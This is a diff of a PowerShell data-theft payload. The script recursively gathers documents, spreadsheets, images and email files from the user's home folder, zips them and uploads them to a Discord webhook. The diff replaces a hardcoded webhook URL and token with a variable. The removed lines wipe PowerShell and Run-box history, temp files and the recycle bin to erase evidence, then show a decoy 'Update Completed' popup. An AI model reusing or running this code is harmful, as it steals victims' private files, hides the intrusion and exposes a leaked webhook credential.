@@ -1,5 +1,5 @@
 ﻿#Replace with your Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1318150550768058368/MY_LuPPM7ULxFoDTqojUmEtnhUogEDeEPhNNKb0YbLOFIRV8-Tr05URV0VSmNvxSDea-"
+$webhookUrl = "$dc"
 
 function Upload-To-Discord($file) {
     $payload = @{
@@ -16,7 +16,7 @@ function Upload-To-Discord($file) {
 }
 
 #Get all files from user's home directory
-$files = Get-ChildItem -Path C:\Users\Michelle\Desktop -Recurse | Where-Object {$.Extension -in ".doc", ".docx", ".ppt", "pptx", ".csv", ".pdf", ".txt", ".xls", ".xlsx", ".jpeg", ".jpg", ".png", ".msg"}
+$files = Get-ChildItem -Path $env:HOMEPATH -Recurse | Where-Object {$.Extension -in ".doc", ".docx", ".ppt", "pptx", ".csv", ".pdf", ".txt", ".xls", ".xlsx", ".jpeg", ".jpg", ".png", ".msg"}
 
 #Create folders for each file type
 $fileTypes = @(".doc", ".docx", ".ppt", "pptx", ".csv", ".pdf", ".txt", ".xls", ".xlsx", ".jpeg", ".jpg", ".png", ".msg")
@@ -48,25 +48,3 @@ foreach ($zipFile in $zipFiles) {
 
 #Clean up temporary files
 Remove-Item "C:\temp*" -Recurse -Force
-
-#This is to clean up behind you and remove any evidence to prove you were there
-
-# Delete contents of Temp folder 
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-# Popup message to signal the payload is done
-
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
